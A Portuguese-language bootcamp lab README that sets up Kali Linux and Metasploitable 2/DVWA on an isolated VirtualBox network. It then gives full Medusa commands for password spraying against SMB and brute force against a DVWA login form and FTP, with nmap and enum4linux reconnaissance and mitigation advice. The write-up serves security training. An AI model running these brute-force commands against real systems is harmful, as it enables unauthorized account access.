# Desafio de Projeto: Ataques de Força Bruta com Kali Linux e Medusa

**Bootcamp:** Santander Cibersegurança 2025 (DIO)
**Módulo:** Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

Este repositório documenta a execução de um desafio de projeto da DIO, focado em simular ataques de força bruta em um ambiente controlado para fins de estudo e aprendizado em segurança da informação.

## 📝 Descrição do Desafio

O objetivo é implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

### Objetivos de Aprendizagem:
- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB).
- Utilizar o Kali Linux e o Medusa para auditoria de segurança.
- Documentar processos técnicos de forma clara.
- Reconhecer vulnerabilidades e propor mitigações.
- Utilizar o GitHub como portfólio técnico.

---

## ⚙️ Tutorial: Configuração do Ambiente no VirtualBox

Para realizar os testes, é necessário configurar um laboratório com duas máquinas virtuais (VMs) em uma rede isolada.

### 1. Download das VMs

- **Kali Linux:**
  - Acesse o site oficial do [Kali Linux](https://www.kali.org/get-kali/#kali-virtual-machines).
  - Baixe a imagem recomendada para o VirtualBox. O arquivo virá no formato `.ova`, pronto para importação.

- **Metasploitable 2:**
  - Esta é uma VM intencionalmente vulnerável para testes.
  - O download pode ser feito através do site da [sourceforge](https://sourceforge.net/projects/metasploitable/files/latest/download).
  - Após o download, você terá um arquivo `.zip`. Descompacte-o para obter os arquivos da VM (como `.vmdk`).

### 2. Configuração da Rede Host-Only no VirtualBox

A rede "Host-Only" (ou "Placa de Rede Exclusiva de Hospedeiro") cria uma rede interna entre o seu computador (hospedeiro) e as VMs, sem acesso à internet.

1.  Abra o VirtualBox e vá em **Arquivo > Ferramentas > Gerenciador de Redes**.
2.  Clique em **Criar** para adicionar uma nova rede `vboxnet`. Geralmente, ela será criada com o IP `192.168.56.1`.
3.  Certifique-se de que o servidor DHCP esteja **desabilitado** para esta rede.

### 3. Importando e Configurando as VMs

- **Kali Linux:**
  1.  No VirtualBox, vá em **Arquivo > Importar Appliance**.
  2.  Selecione o arquivo `.ova` do Kali Linux e siga as instruções.
  3.  Após a importação, selecione a VM do Kali, vá em **Configurações > Rede**.
  4.  No **Adaptador 1**, habilite a placa de rede e conecte-a à **Rede Host-Only** (`vboxnet`).

- **Metasploitable 2:**
  1.  No VirtualBox, clique em **Novo** para criar uma nova VM.
  2.  Nomeie a VM (ex: `Metasploitable2`), escolha o Tipo `Linux` e a Versão `Ubuntu (64-bit)`.
  3.  Na etapa do Disco Rígido, selecione **Usar um arquivo de disco rígido virtual existente** e aponte para o arquivo `.vmdk` que você descompactou.
  4.  Com a VM criada, vá em **Configurações > Rede**.
  5.  No **Adaptador 1**, conecte-a à mesma **Rede Host-Only** usada pelo Kali.

### 4. Iniciando e Verificando o Ambiente

1.  Inicie as duas VMs.
2.  **Login no Metasploitable 2:** O usuário e a senha padrão são `msfadmin`.
3.  **Verifique os IPs:**
    - Na VM do Metasploitable, execute o comando `ifconfig` para descobrir seu endereço IP (ex: `192.168.56.102`).
    - Na VM do Kali, execute `ifconfig` ou `ip a` para ver o IP do Kali (ex: `192.168.56.107`).
4.  **Teste a comunicação:** No Kali, use o comando `ping -c 3 192.168.56.102` (substitua pelo IP do Metasploitable) para garantir que as máquinas estão se comunicando.

---

## 🚀 Comandos e Flags Utilizados

Abaixo estão os comandos executados durante o desafio, com uma explicação de suas funções e flags.

### Comandos de Reconhecimento

| Comando | Descrição |
| :--- | :--- |
| `ping -c 3 192.168.56.102` | Envia 3 pacotes ICMP para o alvo para verificar se ele está ativo na rede. |
| `ifconfig` | (Em desuso, mas ainda comum) Exibe as configurações das interfaces de rede da máquina local. |
| `nmap -sV -p 21,22,80,445,139 192.168.56.107` | Escaneia portas específicas (`-p`) no alvo, tentando identificar a versão dos serviços (`-sV`) em execução. |
| `enum4linux -a 192.168.56.102 \| tee enum4_output.txt` | Ferramenta para enumerar informações de sistemas Windows e Samba. A flag `-a` realiza todas as enumerações simples. O `\| tee` salva a saída no arquivo `enum4_output.txt` e também a exibe na tela. |
| `less enum4_output.txt` | Visualiza o conteúdo do arquivo de saída do `enum4linux` de forma paginada. |

### Criação de Wordlists

| Comando | Descrição |
| :--- | :--- |
| `echo -e "user\nmsfadmin\nservice" > smb_users.txt` | Cria um arquivo `smb_users.txt` com uma lista de possíveis nomes de usuário para o ataque ao SMB. O `\n` cria uma nova linha para cada nome. |
| `echo -e "password\n123456\nwelcome123\nmsfadmin" > senhas_spray.txt` | Cria um arquivo `senhas_spray.txt` com senhas comuns para o ataque de *password spraying*. |
| `echo -e "user\nmsfadmin\nadmin\nroot" > users.txt` | Cria uma wordlist de usuários comuns. |
| `echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt` | Cria uma wordlist de senhas comuns. |

### Ataques com Medusa

**Medusa** é uma ferramenta de força bruta rápida, paralela e modular.

**Flags Comuns:**
- `-h [host]`: Especifica o IP do alvo.
- `-U [arquivo]`: Aponta para o arquivo com a lista de usuários.
- `-P [arquivo]`: Aponta para o arquivo com a lista de senhas.
- `-M [módulo]`: Define o serviço a ser atacado (ex: `smbnt`, `http`, `ftp`).
- `-t [threads]`: Número de tentativas paralelas (threads).
- `-T [total]`: Número total de alvos a serem testados em paralelo.

**1. Password Spraying em SMB**
```bash
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```
- **Descrição:** Tenta autenticar em um serviço SMB (`-M smbnt`) usando uma lista de usuários (`-U`) contra uma lista pequena de senhas (`-P`). É uma técnica para evitar bloqueios de conta.

**2. Força Bruta em Formulário Web (DVWA)**
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```
- **Descrição:** Realiza um ataque de força bruta em uma página de login web.
  - `-m PAGE`: Define a página de login.
  - `-m FORM`: Define a estrutura do formulário, onde `^USER^` e `^PASS^` são substituídos pelos valores das wordlists.
  - `-m 'FAIL=...'`: Especifica o texto que indica uma tentativa de login falha.

**3. Força Bruta em FTP**
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```
- **Descrição:** Tenta descobrir credenciais de acesso para o serviço FTP (`-M ftp`) no alvo.

### Validação de Acesso

| Comando | Descrição |
| :--- | :--- |
| `ftp 192.168.56.102` | Após encontrar uma credencial válida com o Medusa, este comando inicia um cliente FTP para se conectar ao alvo e validar o acesso. |

---

## 🛡️ Recomendações de Mitigação

1.  **Políticas de Senhas Fortes:** Exigir senhas complexas, com comprimento mínimo e variedade de caracteres.
2.  **Bloqueio de Contas:** Implementar um mecanismo que bloqueie contas temporariamente após um número definido de tentativas de login falhas.
3.  **Autenticação Multifator (MFA):** Adicionar uma segunda camada de verificação para dificultar o acesso não autorizado, mesmo que a senha seja descoberta.
4.  **Monitoramento e Alertas:** Manter logs de tentativas de acesso e configurar alertas para atividades suspeitas, como um grande volume de falhas de login.
5.  **CAPTCHA:** Utilizar em formulários web para diferenciar usuários humanos de bots automatizados.
